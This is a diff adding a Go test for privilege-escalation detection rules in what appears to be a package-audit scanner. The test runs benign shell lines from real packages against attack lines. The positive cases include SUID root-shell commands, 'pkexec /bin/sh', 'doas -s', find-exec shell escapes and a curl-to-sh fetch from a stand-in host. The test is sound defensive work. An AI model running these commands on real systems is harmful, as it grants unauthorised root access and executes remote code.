@@ -105,3 +105,35 @@ func TestAuditObfuscationNeedsDecodeAndRun(t *testing.T) {
 	}
 	checkRuleCases(t, neg, pos)
 }
+
+// Privilege rules fired on setgid directories, the Electron sandbox, helper elevation and loops.
+func TestAuditPrivilegeRulesNeedARootShell(t *testing.T) {
+	neg := []ruleCase{
+		{"P-SUID-BIT", "packagist", `run('find ' . $shared . ' -type d -exec chmod 2770 {} +');`},
+		{"P-SUID-BIT", "packagist", `$commandList[] = "chmod -R g+s $releasePath/$writable";`},
+		{"P-SUID-BIT", "npm", `'chmod 2770 "$agent_dir" 2>/dev/null || chmod 0770 "$agent_dir" 2>/dev/null || true',`},
+		{"P-SUID-BIT", "aur", `chmod u+s "${srcdir}/${_pkgname}/chrome-sandbox"`},
+		{"P-SUID-BIT", "npm", "console.log(`    sudo chmod 4755 \"${chromeSandboxPath}\"`)"},
+		{"G-PKEXEC", "aur", `'polkit: pkexec graphical privilege elevation (recommended)'`},
+		{"G-PKEXEC", "npm", "execSync(`pkexec apt-get install -y ${pkgs}`, { stdio: \"inherit\" });"},
+		{"G-PKEXEC", "pypi", `python3 -c 'socket listen' → LISTEN、pkexec sh -c → PRIVESC）。`},
+		{"G-DOAS", "pypi", `ordered_tdoas = np.roll(arrival_times, -ref_receiver, axis=0)`},
+		{"G-DOAS", "cargo", `let analysis = analyze_command("doas ls /root");`},
+		{"G-DOAS", "pypi", `$ cf-remote --ask-pass --switch-user-command "doas /bin/sh -c" info -H bsd-host`},
+		{"G-FIND-EXEC", "npm", `postbuild: find src/cjs -type f -name "*.js" -exec bash -c 'mv "$0" "${0%.js}.cjs"' {} \;`},
+		{"G-FIND-EXEC", "cargo", `@find . -name '*.sh' -not -path './vendor/*' -exec bash -n {} +`},
+		{"G-FIND-EXEC", "aur", `find "$pkgdir/usr/lib/node_modules" -type f \( -name '*.so' -o -name '*.node' \) -exec sh -c 'file "$1" | grep -qi x86-64 && strip --strip-unneeded "$1" || true' sh {} \;`},
+	}
+	pos := []ruleCase{
+		{"P-SUID-BIT", "npm", `("cp SUID abuse",        "sudo cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p"),`},
+		{"P-SUID-BIT", "npm", `chmod u+s /bin/bash`},
+		{"P-SUID-BIT", "npm", `chmod 4755 /tmp/.rootsh && /tmp/.rootsh -p`},
+		{"G-PKEXEC", "npm", `pkexec /bin/sh`},
+		{"G-PKEXEC", "npm", `pkexec --user root bash -i`},
+		{"G-DOAS", "npm", `doas -u root /bin/sh`},
+		{"G-DOAS", "npm", `doas -s`},
+		{"G-FIND-EXEC", "npm", `("find priv esc (SUID)", "find . -exec /bin/sh -p \\; -quit"),`},
+		{"G-FIND-EXEC", "npm", `find / -name x -exec sh -c 'curl -s http://x.example/p | sh' \;`},
+	}
+	checkRuleCases(t, neg, pos)
+}
